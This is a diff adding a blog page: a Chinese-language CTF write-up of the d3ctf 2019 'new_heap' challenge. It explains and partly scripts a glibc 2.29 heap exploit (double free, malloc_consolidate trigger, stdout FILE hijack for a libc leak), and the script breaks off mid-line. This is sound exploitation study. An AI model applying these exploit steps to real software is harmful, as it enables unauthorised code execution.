@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="这题是2019 d3ctf赛的一题，当时没做出来，后来看了大佬的exp脚本，慢慢研究，终于明白了原理，现在，我们就来详细的解析一下这题 首先，我们还是检查一下程序的保护机制,保护全开   再看一下给我们的libc.so.6的版本,可见是glibc2.29，那么对于堆的管理，就存在tcache机制">
+<meta property="og:type" content="article">
+<meta property="og:title" content="d3ctf new_heap">
+<meta property="og:url" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="这题是2019 d3ctf赛的一题，当时没做出来，后来看了大佬的exp脚本，慢慢研究，终于明白了原理，现在，我们就来详细的解析一下这题 首先，我们还是检查一下程序的保护机制,保护全开   再看一下给我们的libc.so.6的版本,可见是glibc2.29，那么对于堆的管理，就存在tcache机制">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image4.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image5.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image6.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image7.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image8.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image9.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image10.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image11.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image12.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image13.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image14.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image15.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image16.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image17.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image18.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image19.JPG">
+<meta property="article:published_time" content="2019-11-28T15:07:50.000Z">
+<meta property="article:modified_time" content="2025-06-21T10:06:12.484Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="tcache">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="IO FILE">
+<meta property="article:tag" content="glib 2.29">
+<meta property="article:tag" content="malloc_consolidate">
+<meta property="article:tag" content="IO FILE作malloc使用">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>d3ctf new_heap | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/11/28/d3ctf_new_heap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          d3ctf new_heap
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-28 23:07:50" itemprop="dateCreated datePublished" datetime="2019-11-28T23:07:50+08:00">2019-11-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 18:06:12" itemprop="dateModified" datetime="2025-06-21T18:06:12+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这题是2019 d3ctf赛的一题，当时没做出来，后来看了大佬的exp脚本，慢慢研究，终于明白了原理，现在，我们就来详细的解析一下这题</p>
+<p>首先，我们还是检查一下程序的保护机制,<strong>保护全开</strong></p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image1.JPG" class="">
+
+<p>再看一下给我们的libc.so.6的版本,可见是glibc2.29，那么对于堆的管理，就存在<strong>tcache机制</strong></p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image2.JPG" class="">
+
+<p>程序只有简单的3个功能，没有show，也没有edit，这让我们手无足措</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image3.JPG" class="">
+
+<p>然后，我们用IDA分析一下</p>
+<p>程序一开始申请了一个0x1000的堆，然后告诉我们了堆地址的低2字节数据</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image4.JPG" class="">
+
+<p>然后释放了这个堆</p>
+<p>接下来，我们在程序中申请堆时，是从0x1000的堆位置开始申请的，因此，我们知道了堆的低2字节</p>
+<p><strong>最多创建18个堆，并且每个堆的大小最多申请0x78（实际大小0x80）</strong></p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image5.JPG" class="">
+
+<p>程序唯一的漏洞在这，free后没有把指针清零，可以造成double free</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image6.JPG" class="">
+
+<p>退出功能，看似没什么奇怪之处</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image7.JPG" class="">
+
+<p>分析到这，我们似乎也找不到一点头绪,果真是高质量题目</p>
+<p>首先，我们总结一下</p>
+<ol>
+<li><p>我们创建不了大的堆，因为做了限制</p>
+</li>
+<li><p>没有show功能，看似也泄露不了什么</p>
+</li>
+<li><p>tcache bin是将空闲块的**[数据域]{.mark}<strong>互相链接组成链表，而fast bin是将空闲块的</strong>[头部]{.mark}**链接起来,tcache bin缺少充分检查，很容易利用，只要修改它的fd，即可申请到某处</p>
+</li>
+</ol>
+<p>4、<strong>只有UAF漏洞可以利用</strong></p>
+<p>即使不需要泄露，我们也需要unsorted bin，因为unsorted bin的fd和bk处有libc中的指针，但是本题大小做了限制，大小范围都落在fastbin的大小里。并且，没有溢出漏洞，不能溢出来修改size。但是，**[unsorted bin是可以通过整理合并fastbin，来生成的。]{.mark}<strong>在ptmalloc中，有一个</strong>[malloc_consolidate]{.mark}**函数，用于将fastbin整理合并到unsorted bin里。malloc_consolidate的条件如下之一</p>
+<ol>
+<li><p>malloc large bin</p>
+</li>
+<li><p>top chunk不够空间</p>
+</li>
+<li><p>在free函数在各种合并前后chunk之后的size大于FASTBIN_CONSOLIDATION_THRESHOLD 也就是65536</p>
+</li>
+</ol>
+<p>本题，如何来触发malloc_consolidate呢，关键就在于退出功能，看似好像没什么用，但是getchar()是个关键的地方。</p>
+<p>由于，本题的**[输入都是用的read]{.mark}**</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image8.JPG" class="">
+
+<p>read函数内部其实是调用sysread,内部不带缓冲区，从打开的设备或文件中读取数据。因此，在未调用功能3之前，_IO_2_1_stdin_结构体的缓冲区未初始化。</p>
+<p>而getchar()、scanf这些，都是带有缓冲区的，它们依靠_IO_2_1_stdin_结构体，而_IO_2_1_stdin_结构体就是FILE结构体，当我们**[第一次]{.mark}<strong>调用带有缓冲区的输入函数时，</strong>[函数会判断fp-&gt;_IO_buf_base输入缓冲区是否为空，如果为空则调用的_IO_doallocbuf去初始化输入缓冲区。]{.mark}**</p>
+<p>我们先运行程序，然后用pwndbg attach到pid上</p>
+<p>在没有执行getchar()时，我们看到的_IO_2_1_stdin_结构体内容如下</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image9.JPG" class="">
+
+<p>然后，我们执行一下getchar()看看</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image10.JPG" class="">
+
+<p>发现，getchar()初始化了缓冲区，并且**[大小为0x400，这个大小属于large bin范围]{.mark}**</p>
+<p>因此，<strong>[功能3可以触发一次malloc_consolidate]{.mark}</strong></p>
+<p>能触发malloc_consolidate，那么，我们就能将fastbin变成unsorted bin来利用</p>
+<p>本题最多总能创建18个堆，因此，我们每一次创建都要慎重考虑，尽可能不浪费。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#chunk0的地址低2字节  </span></span><br><span class="line">low_2_byte = <span class="built_in">int</span>(sh.recv(<span class="number">2</span>),<span class="number">16</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#chunk0~chunk4这5个chunk用于放入tcache bin  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):  </span><br><span class="line">   create(sh,<span class="number">0x50</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x50</span>)  </span><br><span class="line"><span class="comment">#我们需要overlap chunk6，因此，我们需要在chunk6中伪造一个chunk  </span></span><br><span class="line"><span class="comment">#prev_size = 0,size = 0x61,fd = bk = 0，刚好overlap到chunk6结尾  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>)*<span class="number">2</span>  </span><br><span class="line">create(sh,<span class="number">0x50</span>,payload) <span class="comment">#chunk5  </span></span><br><span class="line">create(sh,<span class="number">0x38</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x38</span>) <span class="comment">#chunk6  </span></span><br><span class="line">create(sh,<span class="number">0x50</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x50</span>) <span class="comment">#chunk7 不能靠近top块，因此我们用chunk8挡住  </span></span><br><span class="line">create(sh,<span class="number">0x50</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x50</span>) <span class="comment">#chunk8  </span></span><br></pre></td></tr></table></figure>
+
+<p>我们在chunk5伪造chunk，把chunk6给包含进去(overlap),然后把chunk5里面那个伪造的chunk想办法链到fastbin里面，触发malloc_consolidate,让那个假chunk链接到unsorted bin，然后申请合适大小的堆，使得libc中的指针传递到chunk6的fd处</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk0~chunk5放入tcache bin，使得0x60的tcache bin有6个节点  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):  </span><br><span class="line">   delete(sh,i)  </span><br><span class="line"><span class="comment">#chunk6放入0x40的tcache bin  </span></span><br><span class="line">delete(sh,<span class="number">6</span>)  </span><br><span class="line"><span class="comment">#chunk8 放入0x60的tcache bin  </span></span><br><span class="line">delete(sh,<span class="number">8</span>)  </span><br><span class="line"><span class="comment">#chunk7放入0x60的fastbin  </span></span><br><span class="line">delete(sh,<span class="number">7</span>)  </span><br><span class="line"><span class="comment">#从tcache取出头chunk  </span></span><br><span class="line">create(sh,<span class="number">0x50</span>,<span class="string">&#x27;\n&#x27;</span>)  <span class="comment">#9  </span></span><br><span class="line"><span class="comment">#chunk7 放入tcache bin  </span></span><br><span class="line">delete(sh,<span class="number">7</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>我们先把0~5放入0x60的tcache bin，把chunk6放入0x40的tcache bin，把8放入0x60的tcache bin，接下来delete(7)时，由于0x60的tcache bin已经达到了7个，所以chunk7放在fastbin，由于<strong>fastbin不检查非top的节点double free，于是，我们从tcache里取出一个，再次delete(7)，那么chunk7成为0x60的tcache bin的头结点</strong>。chunk8存在的作用就是使得chunk7不是top，然后我们看看bins的布局</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image11.JPG" class="">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#由于chunk7同时存在于tcache bin和fastbin，又由于tcache bin各指针指向的是chunk的数据区，所以，我们这次create时，顺便低位覆盖，便可以  </span></span><br><span class="line"><span class="comment">#改变chunk7的fd指针，我们要让chunk7的fd指针指向我们在chunk5末尾伪造的那个chunk，由于chunk6被overlap，然后，我们就可以想办法触发malloc_consolidate，生成  </span></span><br><span class="line"><span class="comment">#unsorted bin，再通过申请，把libc中的关键指针传递到chunk6的fd域  </span></span><br><span class="line">create(sh,<span class="number">0x50</span>,p16(((low_2_byte + <span class="number">2</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x70</span>)) <span class="comment">#10也就是chunk7的空间  </span></span><br></pre></td></tr></table></figure>
+
+<p>经过这个create操作后，fastbin里的指针发生了变化</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image12.JPG" class="">
+
+<p>0x60的fastbin里链入了我们伪造的chunk</p>
+<p>接下来，我们触发malloc_consolidate</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#整理fastbin，使得fastbin变成unsorted bin  </span></span><br><span class="line">mallocConsolidate(sh)  </span><br></pre></td></tr></table></figure>
+
+<p>再看看bins的布局</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image13.JPG" class="">
+
+<p>我们伪造的chunk里面fd已经有了libc中的指针，接下来，我们通过申请合适大小的chunk，就能把libc中指针传递到chunk6的fd，使得0x40的tcache bin链上libc中的指针。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#create后，libc中的指针传到了chunk6的fd处  </span></span><br><span class="line"><span class="comment">#我们随便先把/bin/sh字符串保存到这里，最后free_hook时使用  </span></span><br><span class="line">create(sh,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh&#x27;</span>) <span class="comment">#11  </span></span><br></pre></td></tr></table></figure>
+
+<p>现在，再看看bins</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image14.JPG" class="">
+
+<p>因为，我们malloc(0x10)，所以，会**[从unsorted bin里切割0x20，所以unsorted bin头变成了]{.mark}**</p>
+<p><strong>[0x555555757490，然后libc中的指针会被传到下一个chunk，也就是0x555555757490 + 0x10 &#x3D; 0x5555557574a0]{.mark}</strong></p>
+<p>接下来，我们据需申请**[大小不在tcache bin里的chunk，来低位覆盖chunk6的fd]{.mark}**，使得chunk6的fd有可能指向_IO_2_1_stdout_结构体</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#低2字节覆盖，使得chunk6的fd有1/16的可能指向_IO_2_1_stdout_结构体-0x10处  </span></span><br><span class="line">create(sh,<span class="number">0x10</span>,p16((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFFF</span>)) <span class="comment">#12  </span></span><br></pre></td></tr></table></figure>
+
+<p>我们**[为什么要劫持_IO_2_1_stdout_结构体呢]{.mark}**？因为程序在创建堆后有一个puts调用</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image15.JPG" class="">
+
+<p>我们来看看puts的源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>  </span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)  </span><br><span class="line">&#123;  </span><br><span class="line">  <span class="type">int</span> result = EOF;  </span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);  </span><br><span class="line">  _IO_acquire_lock (_IO_stdout);  </span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span>  </span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)  </span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len  </span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)  </span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);  </span><br><span class="line">  _IO_release_lock (_IO_stdout);  </span><br><span class="line">  <span class="keyword">return</span> result;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>_IO_puts，<strong>[其内部调用_IO_sputn,接着执行_IO_new_file_xsputn,最终会执行_IO_overflow]{.mark}</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>  </span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)  </span><br><span class="line">&#123;  </span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;  </span><br><span class="line">      __set_errno (EBADF);  </span><br><span class="line">      <span class="keyword">return</span> EOF;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span>  </span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)  </span><br><span class="line">    ......  </span><br><span class="line">    ......  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)  </span><br><span class="line">    <span class="comment">//我们需要控制_IO_write_base  </span></span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  </span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);  </span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end) <span class="comment">//当两个地址相等就不会输出缓冲区里数据。  </span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)  </span><br><span class="line">      <span class="keyword">return</span> EOF;  </span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;  </span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)  </span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))  </span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,  </span><br><span class="line">              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)  </span><br><span class="line">      <span class="keyword">return</span> EOF;  </span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>通过上面源码分析，当IO_write_ptr与_IO_buf_end不想等的时候就会打印它们之间的字符，而这之间，可以泄露出一些信息，然后我们就能计算出libc基地址，因此，<strong>[我们想办法劫持_IO_2_1_stdout_结构体，将_IO_write_base的低字节覆盖，然后我们调用puts(“done”)时，就能泄露出信息]{.mark}</strong></p>
+<p>当然，由于PIE，我们有**[1&#x2F;16(倒数第4个16进制数可能不一样)]{.mark}**的几率通过低覆盖chunk6的fd，使得fd指向了_IO_2_1_stdout_结构体，我们接下来的操作，都是假设fd正确的指向了_IO_2_1_stdout_结构体</p>
+<img src="/ha1vk/2019/11/28/d3ctf_new_heap/image16.JPG" class="">
+
+<p>当前，覆盖fd，没有指向**<em>IO_2_1_stdout</em>**结构体，当我们假设指向了_IO_2_1_stdout_结构体，那么malloc(0x38)两次就能申请到_IO_2_1_stdout_结构体-0x10处</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">create(sh,<span class="number">0x38</span>,<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#13  </span></span><br><span class="line"><span class="comment">#假设chunk6的fd已经指向了_IO_2_1_stdout_，我们低位覆盖write_base指针  </span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0</span>)  </span><br><span class="line">create(sh,<span class="number">0x38</span>,payload) <span class="comment">#14  </span></span><br><span class="line">response = sh.recvuntil(<span class="string">&#x27;done&#x27;</span>)  </span><br><span class="line"><span class="comment">#没有成功覆盖，说明我们没有命中_IO_2_1_stdout_结构体，抛出异常，重试  </span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(response) &lt; <span class="number">8</span>:  </span><br><span class="line">   <span class="keyword">raise</span> Exception(<span class="string">&#x27;retry&#x27;</span>)  </span><br><span class="line"><span class="comment">#print response  </span></span><br><span class="line"><span class="comment">#低位覆盖后，对应地址处的数据向后偏移8，正好是_IO_stdfile_2_lock的地址  </span></span><br><span class="line">_IO_stdfile_2_lock_addr = u64(response[<span class="number">8</span>:<span 